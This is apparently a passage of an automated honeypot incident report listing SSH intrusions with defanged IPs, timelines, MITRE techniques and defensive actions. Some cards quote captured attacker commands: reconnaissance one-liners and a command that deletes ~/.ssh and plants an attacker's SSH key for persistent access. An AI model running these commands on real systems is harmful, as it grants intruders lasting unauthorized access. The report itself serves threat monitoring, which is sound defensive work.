| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:17` | `cowrie.session.connect` |
| `2026-03-16 05:03:17` | `cowrie.client.version` |
| `2026-03-16 05:03:17` | `cowrie.client.kex` |
| `2026-03-16 05:03:18` | `cowrie.login.success` |
| `2026-03-16 05:03:19` | `cowrie.session.params` |
| `2026-03-16 05:03:19` | `cowrie.command.input` |
| `2026-03-16 05:03:19` | `cowrie.log.closed` |
| `2026-03-16 05:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c938e83521dd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:19` | `cowrie.session.connect` |
| `2026-03-16 05:03:19` | `cowrie.client.version` |
| `2026-03-16 05:03:19` | `cowrie.client.kex` |
| `2026-03-16 05:03:21` | `cowrie.login.success` |
| `2026-03-16 05:03:22` | `cowrie.session.params` |
| `2026-03-16 05:03:22` | `cowrie.command.input` |
| `2026-03-16 05:03:22` | `cowrie.log.closed` |
| `2026-03-16 05:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688d5d200ab9

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:34` | `cowrie.session.connect` |
| `2026-03-16 05:03:34` | `cowrie.client.version` |
| `2026-03-16 05:03:35` | `cowrie.client.kex` |
| `2026-03-16 05:03:36` | `cowrie.login.success` |
| `2026-03-16 05:03:36` | `cowrie.session.params` |
| `2026-03-16 05:03:36` | `cowrie.command.input` |
| `2026-03-16 05:03:36` | `cowrie.log.closed` |
| `2026-03-16 05:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8912fd15adeb

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:35` | `cowrie.session.connect` |
| `2026-03-16 05:03:35` | `cowrie.client.version` |
| `2026-03-16 05:03:35` | `cowrie.client.kex` |
| `2026-03-16 05:03:39` | `cowrie.login.success` |
| `2026-03-16 05:03:40` | `cowrie.session.params` |
| `2026-03-16 05:03:40` | `cowrie.command.input` |
| `2026-03-16 05:03:40` | `cowrie.log.closed` |
| `2026-03-16 05:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039129157bbe

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:39` | `cowrie.session.connect` |
| `2026-03-16 05:03:39` | `cowrie.client.version` |
| `2026-03-16 05:03:40` | `cowrie.client.kex` |
| `2026-03-16 05:03:42` | `cowrie.login.success` |
| `2026-03-16 05:03:42` | `cowrie.session.params` |
| `2026-03-16 05:03:42` | `cowrie.command.input` |
| `2026-03-16 05:03:42` | `cowrie.log.closed` |
| `2026-03-16 05:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2fe2a25c7bc

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:46` | `cowrie.session.connect` |
| `2026-03-16 05:03:46` | `cowrie.client.version` |
| `2026-03-16 05:03:46` | `cowrie.client.kex` |
| `2026-03-16 05:03:50` | `cowrie.login.success` |
| `2026-03-16 05:03:50` | `cowrie.session.params` |
| `2026-03-16 05:03:50` | `cowrie.command.input` |
| `2026-03-16 05:03:50` | `cowrie.log.closed` |
| `2026-03-16 05:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b27fa5a9ecc

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:54` | `cowrie.session.connect` |
| `2026-03-16 05:03:54` | `cowrie.client.version` |
| `2026-03-16 05:03:54` | `cowrie.client.kex` |
| `2026-03-16 05:03:56` | `cowrie.login.success` |
| `2026-03-16 05:03:57` | `cowrie.session.params` |
| `2026-03-16 05:03:57` | `cowrie.command.input` |
| `2026-03-16 05:03:57` | `cowrie.log.closed` |
| `2026-03-16 05:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c82258c430

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:04 |
| **Last Seen** | 2026-03-16 05:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:04:11` | `cowrie.session.connect` |
| `2026-03-16 05:04:14` | `cowrie.client.version` |
| `2026-03-16 05:04:14` | `cowrie.client.kex` |
| `2026-03-16 05:04:15` | `cowrie.login.success` |
| `2026-03-16 05:04:18` | `cowrie.session.params` |
| `2026-03-16 05:04:18` | `cowrie.command.input` |
| `2026-03-16 05:04:19` | `cowrie.log.closed` |
| `2026-03-16 05:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f1f75dbf54

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:04 |
| **Last Seen** | 2026-03-16 05:06 |
| **Session Duration** | 98s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:04:58` | `cowrie.session.connect` |
| `2026-03-16 05:05:03` | `cowrie.client.version` |
| `2026-03-16 05:06:32` | `cowrie.client.kex` |
| `2026-03-16 05:06:35` | `cowrie.login.success` |
| `2026-03-16 05:06:37` | `cowrie.session.params` |
| `2026-03-16 05:06:37` | `cowrie.command.input` |
| `2026-03-16 05:06:37` | `cowrie.log.closed` |
| `2026-03-16 05:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c08ce4f0f9b0

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:05 |
| **Last Seen** | 2026-03-16 05:05 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:05:16` | `cowrie.session.connect` |
| `2026-03-16 05:05:16` | `cowrie.client.version` |
| `2026-03-16 05:05:16` | `cowrie.client.kex` |
| `2026-03-16 05:05:37` | `cowrie.login.success` |
| `2026-03-16 05:05:37` | `cowrie.session.params` |
| `2026-03-16 05:05:37` | `cowrie.command.input` |
| `2026-03-16 05:05:37` | `cowrie.log.closed` |
| `2026-03-16 05:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e964f1b74b6

| Field | Detail |
|---|---|
| **Source IP** | `209.38.80[.]6` |
| **First Seen** | 2026-03-16 05:19 |
| **Last Seen** | 2026-03-16 05:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:19:10` | `cowrie.session.connect` |
| `2026-03-16 05:19:11` | `cowrie.client.version` |
| `2026-03-16 05:19:11` | `cowrie.client.kex` |
| `2026-03-16 05:19:12` | `cowrie.login.success` |
| `2026-03-16 05:19:13` | `cowrie.session.params` |
| `2026-03-16 05:19:13` | `cowrie.command.input` |
| `2026-03-16 05:19:13` | `cowrie.command.input` |
| `2026-03-16 05:19:13` | `cowrie.command.input` |
| `2026-03-16 05:19:13` | `cowrie.command.input` |
| `2026-03-16 05:19:14` | `cowrie.log.closed` |
| `2026-03-16 05:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.80[.]6` to AbuseIPDB if not already reported
- [ ] Block `209.38.80[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc01b6db9bb

| Field | Detail |
|---|---|
| **Source IP** | `209.38.80[.]6` |
| **First Seen** | 2026-03-16 05:20 |
| **Last Seen** | 2026-03-16 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:20:15` | `cowrie.session.connect` |
| `2026-03-16 05:20:15` | `cowrie.client.version` |
| `2026-03-16 05:20:15` | `cowrie.client.kex` |
| `2026-03-16 05:20:16` | `cowrie.login.success` |
| `2026-03-16 05:20:17` | `cowrie.session.params` |
| `2026-03-16 05:20:17` | `cowrie.command.input` |
| `2026-03-16 05:20:17` | `cowrie.command.input` |
| `2026-03-16 05:20:17` | `cowrie.command.input` |
| `2026-03-16 05:20:17` | `cowrie.command.input` |
| `2026-03-16 05:20:18` | `cowrie.log.closed` |
| `2026-03-16 05:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.80[.]6` to AbuseIPDB if not already reported
- [ ] Block `209.38.80[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cde1880708d

| Field | Detail |
|---|---|
| **Source IP** | `209.38.80[.]6` |
| **First Seen** | 2026-03-16 05:21 |
| **Last Seen** | 2026-03-16 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:21:21` | `cowrie.session.connect` |
| `2026-03-16 05:21:21` | `cowrie.client.version` |
| `2026-03-16 05:21:21` | `cowrie.client.kex` |
| `2026-03-16 05:21:23` | `cowrie.login.success` |
| `2026-03-16 05:21:24` | `cowrie.session.params` |
| `2026-03-16 05:21:24` | `cowrie.command.input` |
| `2026-03-16 05:21:24` | `cowrie.command.input` |
| `2026-03-16 05:21:24` | `cowrie.command.input` |
| `2026-03-16 05:21:24` | `cowrie.command.input` |
| `2026-03-16 05:21:25` | `cowrie.log.closed` |
| `2026-03-16 05:21:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.80[.]6` to AbuseIPDB if not already reported
- [ ] Block `209.38.80[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7ecd4578b3

| Field | Detail |
|---|---|
| **Source IP** | `209.38.80[.]6` |
| **First Seen** | 2026-03-16 05:22 |
| **Last Seen** | 2026-03-16 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:22:25` | `cowrie.session.connect` |
| `2026-03-16 05:22:25` | `cowrie.client.version` |
| `2026-03-16 05:22:25` | `cowrie.client.kex` |
| `2026-03-16 05:22:25` | `cowrie.login.success` |
| `2026-03-16 05:22:26` | `cowrie.session.params` |
| `2026-03-16 05:22:26` | `cowrie.command.input` |
| `2026-03-16 05:22:26` | `cowrie.command.input` |
| `2026-03-16 05:22:26` | `cowrie.command.input` |
| `2026-03-16 05:22:26` | `cowrie.command.input` |
| `2026-03-16 05:22:26` | `cowrie.log.closed` |
| `2026-03-16 05:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.80[.]6` to AbuseIPDB if not already reported
- [ ] Block `209.38.80[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a0f54a98c7

| Field | Detail |
|---|---|
| **Source IP** | `183.237.121[.]226` |
| **First Seen** | 2026-03-16 05:27 |
| **Last Seen** | 2026-03-16 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep -c ^processor /proc/cpuinfo` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:27:31` | `cowrie.session.connect` |
| `2026-03-16 05:27:31` | `cowrie.client.version` |
| `2026-03-16 05:27:31` | `cowrie.client.kex` |
| `2026-03-16 05:27:33` | `cowrie.login.success` |
| `2026-03-16 05:27:33` | `cowrie.session.params` |
| `2026-03-16 05:27:33` | `cowrie.command.input` |
| `2026-03-16 05:27:34` | `cowrie.log.closed` |
| `2026-03-16 05:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.237.121[.]226` to AbuseIPDB if not already reported
- [ ] Block `183.237.121[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-189bbc5dcb30

| Field | Detail |
|---|---|
| **Source IP** | `183.237.121[.]226` |
| **First Seen** | 2026-03-16 05:27 |
| **Last Seen** | 2026-03-16 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep -c ^processor /proc/cpuinfo` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:27:37` | `cowrie.session.connect` |
| `2026-03-16 05:27:37` | `cowrie.client.version` |
| `2026-03-16 05:27:37` | `cowrie.client.kex` |
| `2026-03-16 05:27:38` | `cowrie.login.success` |
| `2026-03-16 05:27:40` | `cowrie.session.params` |
| `2026-03-16 05:27:40` | `cowrie.command.input` |
| `2026-03-16 05:27:41` | `cowrie.log.closed` |
| `2026-03-16 05:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.237.121[.]226` to AbuseIPDB if not already reported
- [ ] Block `183.237.121[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2b627edfcf

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-03-16 07:29 |
| **Last Seen** | 2026-03-16 07:34 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 07:29:47` | `cowrie.session.connect` |
| `2026-03-16 07:29:47` | `cowrie.client.version` |
| `2026-03-16 07:29:48` | `cowrie.client.kex` |
| `2026-03-16 07:29:50` | `cowrie.login.success` |
| `2026-03-16 07:29:55` | `cowrie.session.params` |
| `2026-03-16 07:29:55` | `cowrie.command.input` |
| `2026-03-16 07:29:55` | `cowrie.command.failed` |
| `2026-03-16 07:29:55` | `cowrie.log.closed` |
| `2026-03-16 07:29:57` | `cowrie.session.params` |
| `2026-03-16 07:29:57` | `cowrie.command.input` |
| `2026-03-16 07:29:58` | `cowrie.session.file_download` |
| `2026-03-16 07:29:58` | `cowrie.log.closed` |
| `2026-03-16 07:30:16` | `cowrie.session.params` |
| `2026-03-16 07:30:16` | `cowrie.command.input` |
| `2026-03-16 07:30:17` | `cowrie.log.closed` |
| `2026-03-16 07:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c281add16cd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-03-16 07:30 |
| **Last Seen** | 2026-03-16 07:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 07:30:03` | `cowrie.session.connect` |
| `2026-03-16 07:30:03` | `cowrie.client.version` |
| `2026-03-16 07:30:04` | `cowrie.client.kex` |
| `2026-03-16 07:30:06` | `cowrie.login.success` |
| `2026-03-16 07:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1f1f5ff178c

| Field | Detail |
|---|---|
| **Source IP** | `49.43.32[.]40` |
| **First Seen** | 2026-03-16 07:41 |
| **Last Seen** | 2026-03-16 07:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 07:41:00` | `cowrie.session.connect` |
| `2026-03-16 07:41:01` | `cowrie.client.version` |
| `2026-03-16 07:41:01` | `cowrie.client.kex` |
| `2026-03-16 07:41:03` | `cowrie.login.success` |
| `2026-03-16 07:41:04` | `cowrie.direct-tcpip.request` |
| `2026-03-16 07:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.43.32[.]40` to AbuseIPDB if not already reported
- [ ] Block `49.43.32[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5de0c57c8a

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-16 07:49 |
| **Last Seen** | 2026-03-16 07:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 07:49:34` | `cowrie.session.connect` |
| `2026-03-16 07:49:34` | `cowrie.client.version` |
| `2026-03-16 07:49:34` | `cowrie.client.kex` |
| `2026-03-16 07:49:35` | `cowrie.login.success` |
| `2026-03-16 07:49:36` | `cowrie.session.params` |
| `2026-03-16 07:49:36` | `cowrie.command.input` |
| `2026-03-16 07:49:36` | `cowrie.command.failed` |
| `2026-03-16 07:49:36` | `cowrie.log.closed` |
| `2026-03-16 07:49:37` | `cowrie.session.params` |
| `2026-03-16 07:49:37` | `cowrie.command.input` |
| `2026-03-16 07:49:37` | `cowrie.session.file_download` |
| `2026-03-16 07:49:37` | `cowrie.log.closed` |
| `2026-03-16 07:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f77e735b06

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-16 07:49 |
| **Last Seen** | 2026-03-16 07:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
